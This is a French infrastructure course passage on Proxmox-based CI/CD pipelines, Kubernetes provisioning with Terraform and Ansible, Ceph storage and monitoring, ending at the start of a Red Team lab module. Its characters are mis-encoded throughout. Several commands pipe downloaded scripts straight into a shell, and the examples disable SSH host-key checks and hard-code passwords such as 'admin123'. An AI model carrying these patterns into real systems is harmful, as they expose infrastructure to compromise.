            â”‚â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ â”‚â”Œâ”€â”€â”€â”€â”€â”€â”€â”â”‚ â”‚â”Œâ”€â”€â”€â”€â”€â”€â”€â”â”‚
            â”‚â”‚VM Buildâ”‚â”‚ â”‚â”‚VM Testâ”‚â”‚ â”‚â”‚VM Prodâ”‚â”‚
            â”‚â”‚ Node 1 â”‚â”‚ â”‚â”‚ Env 1 â”‚â”‚ â”‚â”‚ Env 1 â”‚â”‚
            â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”˜â”‚ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
            â”‚â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ â”‚â”Œâ”€â”€â”€â”€â”€â”€â”€â”â”‚ â”‚â”Œâ”€â”€â”€â”€â”€â”€â”€â”â”‚
            â”‚â”‚VM Buildâ”‚â”‚ â”‚â”‚VM Testâ”‚â”‚ â”‚â”‚VM Prodâ”‚â”‚
            â”‚â”‚ Node 2 â”‚â”‚ â”‚â”‚ Env 2 â”‚â”‚ â”‚â”‚ Env 2 â”‚â”‚
            â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”˜â”‚ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Avantages virtualisation CI/CD :
âœ“ Isolation complÃ¨te des builds
âœ“ Environnements reproductibles
âœ“ ScalabilitÃ© Ã©lastique
âœ“ Optimisation par type de charge
âœ“ RÃ©cupÃ©ration rapide aprÃ¨s Ã©chec
âœ“ Tests multi-OS simultanÃ©s
```

### GitLab Runner sur Proxmox

**Configuration GitLab Runner avec exÃ©cuteurs VM :**

```bash
# Installation GitLab Runner
curl -L "https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.deb.sh" | sudo bash
sudo apt-get install gitlab-runner

# Enregistrement runner avec exÃ©cuteur shell
sudo gitlab-runner register \
  --url "https://gitlab.company.com/" \
  --registration-token "YOUR_TOKEN" \
  --executor "shell" \
  --description "proxmox-shell-runner" \
  --tag-list "proxmox,shell,build"

# Configuration avancÃ©e
# /etc/gitlab-runner/config.toml
concurrent = 4
check_interval = 0

[session_server]
  session_timeout = 1800

[[runners]]
  name = "proxmox-vm-runner"
  url = "https://gitlab.company.com/"
  token = "YOUR_TOKEN"
  executor = "shell"
  
  [runners.custom_build_dir]
    enabled = true
  
  [runners.cache]
    Type = "local"
    Path = "/opt/gitlab-runner/cache"
    Shared = true
  
  [runners.shell]
    shell = "bash"
```

**Pipeline avec crÃ©ation VM dynamique :**

```yaml
# .gitlab-ci.yml
stages:
  - prepare
  - build
  - test
  - deploy
  - cleanup

variables:
  VM_TEMPLATE: "ubuntu-22.04-ci-template"
  VM_NODE: "proxmox1"
  VM_STORAGE: "local-lvm"

create_build_vm:
  stage: prepare
  script:
    - |
      # CrÃ©ation VM temporaire pour le build
      VM_ID=$(pvesh get /cluster/nextid)
      qm clone 9000 $VM_ID --name "ci-build-${CI_PIPELINE_ID}" --target $VM_NODE
      qm set $VM_ID --memory 4096 --cores 4
      qm set $VM_ID --net0 virtio,bridge=vmbr0,tag=20
      qm start $VM_ID
      
      # Attendre dÃ©marrage
      sleep 60
      
      # RÃ©cupÃ©rer IP
      VM_IP=$(qm guest cmd $VM_ID network-get-interfaces | jq -r '.[] | select(.name=="eth0") | .["ip-addresses"][] | select(.["ip-address-type"]=="ipv4") | .["ip-address"]')
      
      echo "VM_ID=$VM_ID" > vm_info.env
      echo "VM_IP=$VM_IP" >> vm_info.env
  artifacts:
    reports:
      dotenv: vm_info.env
    expire_in: 1 hour

build_application:
  stage: build
  dependencies:
    - create_build_vm
  script:
    - |
      # Connexion Ã  la VM de build
      ssh -o StrictHostKeyChecking=no ci-user@$VM_IP << 'EOF'
        # Installation dÃ©pendances
        sudo apt update
        sudo apt install -y nodejs npm docker.io
        
        # Clone du code
        git clone $CI_REPOSITORY_URL app
        cd app
        git checkout $CI_COMMIT_SHA
        
        # Build application
        npm install
        npm run build
        
        # Build image Docker
        docker build -t app:$CI_COMMIT_SHA .
        docker save app:$CI_COMMIT_SHA > app-image.tar
      EOF
      
      # RÃ©cupÃ©ration artefacts
      scp ci-user@$VM_IP:~/app/app-image.tar .
      scp ci-user@$VM_IP:~/app/dist ./dist
  artifacts:
    paths:
      - app-image.tar
      - dist/
    expire_in: 1 day

test_application:
  stage: test
  dependencies:
    - create_build_vm
    - build_application
  script:
    - |
      # Tests unitaires
      ssh ci-user@$VM_IP << 'EOF'
        cd app
        npm test
        npm run test:coverage
      EOF
      
      # Tests d'intÃ©gration avec Docker
      docker load < app-image.tar
      docker run -d --name test-app -p 3000:3000 app:$CI_COMMIT_SHA
      
      # Tests fonctionnels
      sleep 10
      curl -f http://localhost:3000/health || exit 1
      
      # Nettoyage
      docker stop test-app
      docker rm test-app

cleanup_vm:
  stage: cleanup
  dependencies:
    - create_build_vm
  script:
    - |
      # Suppression VM temporaire
      qm stop $VM_ID
      qm destroy $VM_ID --purge
  when: always
```

### Jenkins avec Proxmox Cloud Plugin

**Configuration Jenkins pour Proxmox :**

```groovy
// Jenkinsfile
pipeline {
    agent none
    
    environment {
        PROXMOX_URL = 'https://192.168.1.10:8006'
        PROXMOX_NODE = 'proxmox1'
        VM_TEMPLATE = '9000'
    }
    
    stages {
        stage('Provision Build Environment') {
            steps {
                script {
                    // CrÃ©ation VM via API Proxmox
                    def vmId = sh(
                        script: "pvesh get /cluster/nextid",
                        returnStdout: true
                    ).trim()
                    
                    sh """
                        qm clone ${VM_TEMPLATE} ${vmId} --name "jenkins-build-${BUILD_NUMBER}"
                        qm set ${vmId} --memory 8192 --cores 4
                        qm set ${vmId} --net0 virtio,bridge=vmbr0,tag=20
                        qm start ${vmId}
                    """
                    
                    env.BUILD_VM_ID = vmId
                    
                    // Attendre disponibilitÃ© SSH
                    timeout(time: 5, unit: 'MINUTES') {
                        waitUntil {
                            script {
                                def result = sh(
                                    script: "qm guest ping ${vmId}",
                                    returnStatus: true
                                )
                                return result == 0
                            }
                        }
                    }
                }
            }
        }
        
        stage('Build') {
            agent {
                label "vm-${env.BUILD_VM_ID}"
            }
            steps {
                checkout scm
                
                sh '''
                    # Installation dÃ©pendances
                    sudo apt update
                    sudo apt install -y nodejs npm
                    
                    # Build application
                    npm install
                    npm run build
                    npm test
                '''
                
                archiveArtifacts artifacts: 'dist/**', fingerprint: true
            }
        }
        
        stage('Docker Build') {
            agent {
                label "vm-${env.BUILD_VM_ID}"
            }
            steps {
                script {
                    def image = docker.build("myapp:${env.BUILD_NUMBER}")
                    docker.withRegistry('https://registry.company.com', 'registry-credentials') {
                        image.push()
                        image.push("latest")
                    }
                }
            }
        }
        
        stage('Integration Tests') {
            parallel {
                stage('Unit Tests') {
                    agent {
                        label "vm-${env.BUILD_VM_ID}"
                    }
                    steps {
                        sh 'npm run test:unit'
                        publishTestResults testResultsPattern: 'test-results.xml'
                    }
                }
                
                stage('Security Scan') {
                    agent {
                        label "security-scanner"
                    }
                    steps {
                        sh '''
                            # Scan de sÃ©curitÃ© avec Trivy
                            trivy image myapp:${BUILD_NUMBER}
                            
                            # Scan SAST avec SonarQube
                            sonar-scanner -Dsonar.projectKey=myapp
                        '''
                    }
                }
            }
        }
        
        stage('Deploy to Staging') {
            agent {
                label "deployment"
            }
            steps {
                script {
                    // DÃ©ploiement sur environnement de staging
                    sh '''
                        # Mise Ã  jour Kubernetes
                        kubectl set image deployment/myapp-staging myapp=registry.company.com/myapp:${BUILD_NUMBER}
                        kubectl rollout status deployment/myapp-staging
                        
                        # Tests de fumÃ©e
                        sleep 30
                        curl -f http://staging.company.com/health
                    '''
                }
            }
        }
        
        stage('Deploy to Production') {
            when {
                branch 'main'
            }
            agent {
                label "deployment"
            }
            steps {
                input message: 'Deploy to production?', ok: 'Deploy'
                
                script {
                    sh '''
                        # DÃ©ploiement blue-green
                        kubectl apply -f k8s/production/
                        kubectl set image deployment/myapp-prod myapp=registry.company.com/myapp:${BUILD_NUMBER}
                        kubectl rollout status deployment/myapp-prod
                        
                        # VÃ©rification santÃ©
                        kubectl get pods -l app=myapp
                        curl -f http://prod.company.com/health
                    '''
                }
            }
        }
    }
    
    post {
        always {
            script {
                // Nettoyage VM de build
                if (env.BUILD_VM_ID) {
                    sh """
                        qm stop ${env.BUILD_VM_ID} || true
                        qm destroy ${env.BUILD_VM_ID} --purge || true
                    """
                }
            }
        }
        
        success {
            slackSend(
                color: 'good',
                message: "âœ… Build ${env.BUILD_NUMBER} succeeded for ${env.JOB_NAME}"
            )
        }
        
        failure {
            slackSend(
                color: 'danger',
                message: "âŒ Build ${env.BUILD_NUMBER} failed for ${env.JOB_NAME}"
            )
        }
    }
}
```

### Optimisation des performances CI/CD

**Cache distribuÃ© et artefacts :**

```bash
# Configuration cache Redis pour builds
# /etc/gitlab-runner/config.toml
[[runners]]
  [runners.cache]
    Type = "redis"
    Host = "192.168.1.50:6379"
    Password = "cache_password"
    
  [runners.cache.redis]
    MaxItemSize = 1073741824  # 1GB
```

**Templates optimisÃ©s pour CI/CD :**

```bash
# CrÃ©ation template CI/CD optimisÃ©
# Base Ubuntu avec outils prÃ©-installÃ©s
qm create 9001 --name "ubuntu-ci-template" --memory 2048 --cores 2 --net0 virtio,bridge=vmbr0

# Installation outils communs
virt-customize -a /var/lib/vz/images/9001/vm-9001-disk-0.qcow2 \
  --install git,curl,wget,build-essential,nodejs,npm,docker.io,python3,pip \
  --run-command "npm install -g yarn" \
  --run-command "pip3 install ansible" \
  --run-command "curl -fsSL https://get.docker.com | sh" \
  --run-command "usermod -aG docker ci-user"

# Conversion en template
qm template 9001
```

### Monitoring et mÃ©triques CI/CD

**Surveillance des pipelines :**

```python
# monitoring/pipeline_metrics.py
import requests
import time
from prometheus_client import start_http_server, Gauge, Counter

# MÃ©triques Prometheus
pipeline_duration = Gauge('gitlab_pipeline_duration_seconds', 'Pipeline duration', ['project', 'branch'])
pipeline_success = Counter('gitlab_pipeline_success_total', 'Successful pipelines', ['project'])
pipeline_failure = Counter('gitlab_pipeline_failure_total', 'Failed pipelines', ['project'])
vm_creation_time = Gauge('proxmox_vm_creation_seconds', 'VM creation time')

def collect_gitlab_metrics():
    """Collecte mÃ©triques GitLab CI/CD"""
    gitlab_url = "https://gitlab.company.com"
    headers = {"PRIVATE-TOKEN": "your-token"}
    
    projects = requests.get(f"{gitlab_url}/api/v4/projects", headers=headers).json()
    
    for project in projects:
        project_id = project['id']
        project_name = project['name']
        
        # RÃ©cupÃ©ration pipelines rÃ©cents
        pipelines = requests.get(
            f"{gitlab_url}/api/v4/projects/{project_id}/pipelines",
            headers=headers,
            params={"per_page": 10}
        ).json()
        
        for pipeline in pipelines:
            if pipeline['status'] == 'success':
                pipeline_success.labels(project=project_name).inc()
            elif pipeline['status'] == 'failed':
                pipeline_failure.labels(project=project_name).inc()
                
            # DurÃ©e pipeline
            if pipeline['duration']:
                pipeline_duration.labels(
                    project=project_name,
                    branch=pipeline['ref']
                ).set(pipeline['duration'])

if __name__ == '__main__':
    start_http_server(8000)
    while True:
        collect_gitlab_metrics()
        time.sleep(60)
```

### Cas d'usage spÃ©cialisÃ©s

**Microservices CI/CD :** CrÃ©ez des pipelines parallÃ¨les avec des VMs spÃ©cialisÃ©es par service. Utilisez des templates optimisÃ©s pour chaque stack technologique (Node.js, Python, Go, etc.).

**Tests de charge automatisÃ©s :** Provisionnez dynamiquement des clusters de VMs pour les tests de performance. Configurez des environnements Ã©phÃ©mÃ¨res qui se dÃ©truisent automatiquement aprÃ¨s les tests.

**DÃ©ploiements multi-environnements :** ImplÃ©mentez des pipelines de promotion automatique entre environnements (dev â†’ staging â†’ prod) avec validation automatique et rollback en cas d'Ã©chec.

---

## 6.3 Kubernetes et conteneurs

### Kubernetes sur infrastructure virtualisÃ©e

**Kubernetes** sur infrastructure virtualisÃ©e combine les avantages de l'orchestration de conteneurs avec la flexibilitÃ© et l'isolation des machines virtuelles. Cette approche hybride permet de bÃ©nÃ©ficier de la portabilitÃ© des conteneurs tout en conservant les garanties de sÃ©curitÃ© et d'isolation des VMs.

Imaginez cette architecture comme un **centre commercial moderne** : Kubernetes est le gestionnaire qui organise les boutiques (conteneurs) dans diffÃ©rents Ã©tages (nÅ“uds), tandis que la virtualisation fournit les bÃ¢timents sÃ©curisÃ©s et isolÃ©s (VMs) qui hÃ©bergent ces Ã©tages. Cette sÃ©paration permet une gestion fine des ressources et une sÃ©curitÃ© renforcÃ©e.

### Architecture Kubernetes sur Proxmox

```
Kubernetes Cluster sur Proxmox :

                    Proxmox Cluster
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                                                     â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚ Node 1      â”‚  â”‚ Node 2      â”‚  â”‚ Node 3      â”‚ â”‚
â”‚  â”‚ proxmox1    â”‚  â”‚ proxmox2    â”‚  â”‚ proxmox3    â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚                â”‚                â”‚
    â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
    â”‚ VM Master 1 â”‚  â”‚ VM Master 2 â”‚  â”‚ VM Master 3 â”‚
    â”‚ k8s-master-1â”‚  â”‚ k8s-master-2â”‚  â”‚ k8s-master-3â”‚
    â”‚ 4 vCPU      â”‚  â”‚ 4 vCPU      â”‚  â”‚ 4 vCPU      â”‚
    â”‚ 8 GB RAM    â”‚  â”‚ 8 GB RAM    â”‚  â”‚ 8 GB RAM    â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚                â”‚                â”‚
    â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
    â”‚ VM Worker 1 â”‚  â”‚ VM Worker 2 â”‚  â”‚ VM Worker 3 â”‚
    â”‚ k8s-worker-1â”‚  â”‚ k8s-worker-2â”‚  â”‚ k8s-worker-3â”‚
    â”‚ 8 vCPU      â”‚  â”‚ 8 vCPU      â”‚  â”‚ 8 vCPU      â”‚
    â”‚ 16 GB RAM   â”‚  â”‚ 16 GB RAM   â”‚  â”‚ 16 GB RAM   â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚                â”‚                â”‚
    â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”
    â”‚ VM Worker 4 â”‚  â”‚ VM Worker 5 â”‚  â”‚ VM Worker 6 â”‚
    â”‚ k8s-worker-4â”‚  â”‚ k8s-worker-5â”‚  â”‚ k8s-worker-6â”‚
    â”‚ 8 vCPU      â”‚  â”‚ 8 vCPU      â”‚  â”‚ 8 vCPU      â”‚
    â”‚ 16 GB RAM   â”‚  â”‚ 16 GB RAM   â”‚  â”‚ 16 GB RAM   â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Avantages architecture hybride :
âœ“ Isolation renforcÃ©e (VM + namespace)
âœ“ SÃ©curitÃ© multi-tenant
âœ“ FlexibilitÃ© dimensionnement
âœ“ Migration Ã  chaud possible
âœ“ RÃ©cupÃ©ration granulaire
âœ“ CompatibilitÃ© legacy
```

### DÃ©ploiement automatisÃ© avec Terraform

**Infrastructure Kubernetes complÃ¨te :**

```hcl
# kubernetes-cluster.tf
variable "cluster_name" {
  description = "Kubernetes cluster name"
  type        = string
  default     = "production"
}

variable "master_count" {
  description = "Number of master nodes"
  type        = number
  default     = 3
}

variable "worker_count" {
  description = "Number of worker nodes"
  type        = number
  default     = 6
}

# Master nodes
resource "proxmox_vm_qemu" "k8s_masters" {
  count       = var.master_count
  name        = "k8s-master-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  clone      = "ubuntu-22.04-k8s-template"
  full_clone = true
  
  # Optimized for control plane
  cores   = 4
  sockets = 1
  memory  = 8192
  
  # Fast storage for etcd
  disk {
    size     = "50G"
    type     = "scsi"
    storage  = "local-ssd"
    iothread = 1
    discard  = "on"
  }
  
  # Dedicated management network
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 10
  }
  
  # Cloud-init configuration
  os_type    = "cloud-init"
  ipconfig0  = "ip=192.168.10.${10 + count.index}/24,gw=192.168.10.1"
  nameserver = "8.8.8.8"
  sshkeys    = file("~/.ssh/id_rsa.pub")
  
  # Kubernetes-specific settings
  agent    = 1
  qemu_os  = "l26"
  cpu      = "host"
  numa     = true
  
  tags = "${var.cluster_name},kubernetes,master,terraform"
  
  lifecycle {
    ignore_changes = [
      network,
      disk,
    ]
  }
}

# Worker nodes
resource "proxmox_vm_qemu" "k8s_workers" {
  count       = var.worker_count
  name        = "k8s-worker-${count.index + 1}"
  target_node = "proxmox${(count.index % 3) + 1}"
  
  clone      = "ubuntu-22.04-k8s-template"
  full_clone = true
  
  # Optimized for workloads
  cores   = 8
  sockets = 1
  memory  = 16384
  
  # Storage for containers and logs
  disk {
    size     = "100G"
    type     = "scsi"
    storage  = "ceph-storage"
    iothread = 1
    discard  = "on"
  }
  
  # Additional disk for container storage
  disk {
    size     = "200G"
    type     = "scsi"
    storage  = "ceph-storage"
    iothread = 1
    discard  = "on"
  }
  
  # Pod network
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 20
  }
  
  os_type    = "cloud-init"
  ipconfig0  = "ip=192.168.20.${10 + count.index}/24,gw=192.168.20.1"
  nameserver = "8.8.8.8"
  sshkeys    = file("~/.ssh/id_rsa.pub")
  
  agent    = 1
  qemu_os  = "l26"
  cpu      = "host"
  numa     = true
  
  tags = "${var.cluster_name},kubernetes,worker,terraform"
}

# Load balancer for API server
resource "proxmox_vm_qemu" "k8s_lb" {
  name        = "k8s-lb-${var.cluster_name}"
  target_node = "proxmox1"
  
  clone      = "ubuntu-22.04-template"
  full_clone = true
  
  cores  = 2
  memory = 4096
  
  disk {
    size    = "20G"
    type    = "scsi"
    storage = "local-lvm"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 30  # DMZ
  }
  
  ipconfig0 = "ip=192.168.30.10/24,gw=192.168.30.1"
  sshkeys   = file("~/.ssh/id_rsa.pub")
  
  tags = "${var.cluster_name},loadbalancer,haproxy"
}

# Outputs
output "master_ips" {
  value = proxmox_vm_qemu.k8s_masters[*].default_ipv4_address
}

output "worker_ips" {
  value = proxmox_vm_qemu.k8s_workers[*].default_ipv4_address
}

output "lb_ip" {
  value = proxmox_vm_qemu.k8s_lb.default_ipv4_address
}
```

### Configuration Kubernetes avec Ansible

**Playbook complet d'installation :**

```yaml
# playbooks/kubernetes.yml
---
- name: Prepare all nodes
  hosts: all
  become: yes
  vars:
    kubernetes_version: "1.28.0"
    containerd_version: "1.7.0"
    
  tasks:
    - name: Disable swap
      shell: |
        swapoff -a
        sed -i '/ swap / s/^\(.*\)$/#\1/g' /etc/fstab
        
    - name: Load kernel modules
      modprobe:
        name: "{{ item }}"
        state: present
      loop:
        - overlay
        - br_netfilter
        
    - name: Set kernel parameters
      sysctl:
        name: "{{ item.name }}"
        value: "{{ item.value }}"
        state: present
        reload: yes
      loop:
        - { name: 'net.bridge.bridge-nf-call-iptables', value: '1' }
        - { name: 'net.bridge.bridge-nf-call-ip6tables', value: '1' }
        - { name: 'net.ipv4.ip_forward', value: '1' }
        
    - name: Install containerd
      apt:
        name: containerd.io={{ containerd_version }}*
        state: present
        update_cache: yes
        
    - name: Configure containerd
      copy:
        content: |
          version = 2
          [plugins."io.containerd.grpc.v1.cri"]
            [plugins."io.containerd.grpc.v1.cri".containerd]
              [plugins."io.containerd.grpc.v1.cri".containerd.runtimes]
                [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc]
                  runtime_type = "io.containerd.runc.v2"
                  [plugins."io.containerd.grpc.v1.cri".containerd.runtimes.runc.options]
                    SystemdCgroup = true
        dest: /etc/containerd/config.toml
      notify: restart containerd
        
    - name: Install Kubernetes packages
      apt:
        name:
          - kubelet={{ kubernetes_version }}-00
          - kubeadm={{ kubernetes_version }}-00
          - kubectl={{ kubernetes_version }}-00
        state: present
        
    - name: Hold Kubernetes packages
      dpkg_selections:
        name: "{{ item }}"
        selection: hold
      loop:
        - kubelet
        - kubeadm
        - kubectl

- name: Configure load balancer
  hosts: loadbalancer
  become: yes
  tasks:
    - name: Install HAProxy
      apt:
        name: haproxy
        state: present
        
    - name: Configure HAProxy for Kubernetes API
      copy:
        content: |
          global
              daemon
              
          defaults
              mode http
              timeout connect 5000ms
              timeout client 50000ms
              timeout server 50000ms
              
          frontend kubernetes-api
              bind *:6443
              mode tcp
              default_backend kubernetes-masters
              
          backend kubernetes-masters
              mode tcp
              balance roundrobin
              {% for host in groups['masters'] %}
              server {{ host }} {{ hostvars[host]['ansible_default_ipv4']['address'] }}:6443 check
              {% endfor %}
        dest: /etc/haproxy/haproxy.cfg
      notify: restart haproxy

- name: Initialize Kubernetes cluster
  hosts: masters[0]
  become: yes
  tasks:
    - name: Initialize cluster
      command: >
        kubeadm init
        --control-plane-endpoint="{{ hostvars[groups['loadbalancer'][0]]['ansible_default_ipv4']['address'] }}:6443"
        --upload-certs
        --pod-network-cidr=10.244.0.0/16
        --service-cidr=10.96.0.0/12
      register: kubeadm_init
      
    - name: Save join commands
      set_fact:
        master_join_command: "{{ kubeadm_init.stdout_lines | select('match', '.*kubeadm join.*control-plane.*') | first }}"
        worker_join_command: "{{ kubeadm_init.stdout_lines | select('match', '.*kubeadm join.*') | reject('match', '.*control-plane.*') | first }}"
        
    - name: Setup kubectl for root
      shell: |
        mkdir -p /root/.kube
        cp -i /etc/kubernetes/admin.conf /root/.kube/config
        chown root:root /root/.kube/config
        
    - name: Install Flannel CNI
      shell: kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml

- name: Join master nodes
  hosts: masters[1:]
  become: yes
  tasks:
    - name: Join cluster as master
      shell: "{{ hostvars[groups['masters'][0]]['master_join_command'] }}"
      
- name: Join worker nodes
  hosts: workers
  become: yes
  tasks:
    - name: Join cluster as worker
      shell: "{{ hostvars[groups['masters'][0]]['worker_join_command'] }}"

  handlers:
    - name: restart containerd
      systemd:
        name: containerd
        state: restarted
        
    - name: restart haproxy
      systemd:
        name: haproxy
        state: restarted
```

### Stockage persistant avec Ceph CSI

**Configuration Ceph CSI pour Kubernetes :**

```yaml
# ceph-csi-config.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: ceph-csi-config
  namespace: ceph-csi-rbd
data:
  config.json: |
    [
      {
        "clusterID": "b9127830-b0cc-4e34-aa47-9d1a2e9949a8",
        "monitors": [
          "192.168.1.10:6789",
          "192.168.1.11:6789",
          "192.168.1.12:6789"
        ]
      }
    ]

---
# StorageClass pour RBD
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
  name: ceph-rbd-ssd
provisioner: rbd.csi.ceph.com
parameters:
  clusterID: b9127830-b0cc-4e34-aa47-9d1a2e9949a8
  pool: kubernetes-pool
  imageFeatures: layering
  csi.storage.k8s.io/provisioner-secret-name: csi-rbd-secret
  csi.storage.k8s.io/provisioner-secret-namespace: ceph-csi-rbd
  csi.storage.k8s.io/controller-expand-secret-name: csi-rbd-secret
  csi.storage.k8s.io/controller-expand-secret-namespace: ceph-csi-rbd
  csi.storage.k8s.io/node-stage-secret-name: csi-rbd-secret
  csi.storage.k8s.io/node-stage-secret-namespace: ceph-csi-rbd
  csi.storage.k8s.io/fstype: ext4
reclaimPolicy: Delete
allowVolumeExpansion: true
mountOptions:
  - discard

---
# PersistentVolumeClaim exemple
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: mysql-pvc
spec:
  accessModes:
    - ReadWriteOnce
  storageClassName: ceph-rbd-ssd
  resources:
    requests:
      storage: 20Gi
```

### Monitoring avec Prometheus et Grafana

**Stack de monitoring Kubernetes :**

```yaml
# monitoring-stack.yaml
apiVersion: v1
kind: Namespace
metadata:
  name: monitoring

---
# Prometheus configuration
apiVersion: v1
kind: ConfigMap
metadata:
  name: prometheus-config
  namespace: monitoring
data:
  prometheus.yml: |
    global:
      scrape_interval: 15s
      evaluation_interval: 15s
      
    rule_files:
      - "/etc/prometheus/rules/*.yml"
      
    scrape_configs:
      - job_name: 'kubernetes-apiservers'
        kubernetes_sd_configs:
        - role: endpoints
        scheme: https
        tls_config:
          ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
        bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token
        relabel_configs:
        - source_labels: [__meta_kubernetes_namespace, __meta_kubernetes_service_name, __meta_kubernetes_endpoint_port_name]
          action: keep
          regex: default;kubernetes;https
          
      - job_name: 'kubernetes-nodes'
        kubernetes_sd_configs:
        - role: node
        scheme: https
        tls_config:
          ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
        bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token
        relabel_configs:
        - action: labelmap
          regex: __meta_kubernetes_node_label_(.+)
          
      - job_name: 'kubernetes-pods'
        kubernetes_sd_configs:
        - role: pod
        relabel_configs:
        - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
          action: keep
          regex: true
        - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_path]
          action: replace
          target_label: __metrics_path__
          regex: (.+)

---
# Grafana deployment
apiVersion: apps/v1
kind: Deployment
metadata:
  name: grafana
  namespace: monitoring
spec:
  replicas: 1
  selector:
    matchLabels:
      app: grafana
  template:
    metadata:
      labels:
        app: grafana
    spec:
      containers:
      - name: grafana
        image: grafana/grafana:latest
        ports:
        - containerPort: 3000
        env:
        - name: GF_SECURITY_ADMIN_PASSWORD
          value: "admin123"
        volumeMounts:
        - name: grafana-storage
          mountPath: /var/lib/grafana
      volumes:
      - name: grafana-storage
        persistentVolumeClaim:
          claimName: grafana-pvc

---
# Service pour Grafana
apiVersion: v1
kind: Service
metadata:
  name: grafana
  namespace: monitoring
spec:
  selector:
    app: grafana
  ports:
  - port: 3000
    targetPort: 3000
  type: LoadBalancer
```

### Cas d'usage spÃ©cialisÃ©s

**Environnement multi-tenant :** Utilisez des namespaces Kubernetes avec des VMs dÃ©diÃ©es par tenant pour une isolation renforcÃ©e. Configurez des NetworkPolicies et PodSecurityPolicies strictes.

**Applications legacy :** DÃ©ployez des applications monolithiques dans des VMs tout en utilisant Kubernetes pour orchestrer les services modernes. Configurez des services de type ExternalName pour l'intÃ©gration.

**Edge computing :** ImplÃ©mentez des clusters Kubernetes lÃ©gers sur des VMs optimisÃ©es pour les environnements contraints. Utilisez K3s ou MicroK8s pour rÃ©duire l'empreinte ressource.

---


# Module 7 : Cas d'Usage CybersÃ©curitÃ©

## 7.1 Laboratoires Red Team

### Architecture de laboratoire Red Team

Un **laboratoire Red Team** simule des environnements d'entreprise rÃ©alistes pour l'entraÃ®nement aux tests de pÃ©nÃ©tration et l'Ã©valuation de la sÃ©curitÃ©. La virtualisation permet de crÃ©er des infrastructures complexes, isolÃ©es et reproductibles, essentielles pour dÃ©velopper et tester des techniques d'attaque sans risque pour les systÃ¨mes de production.

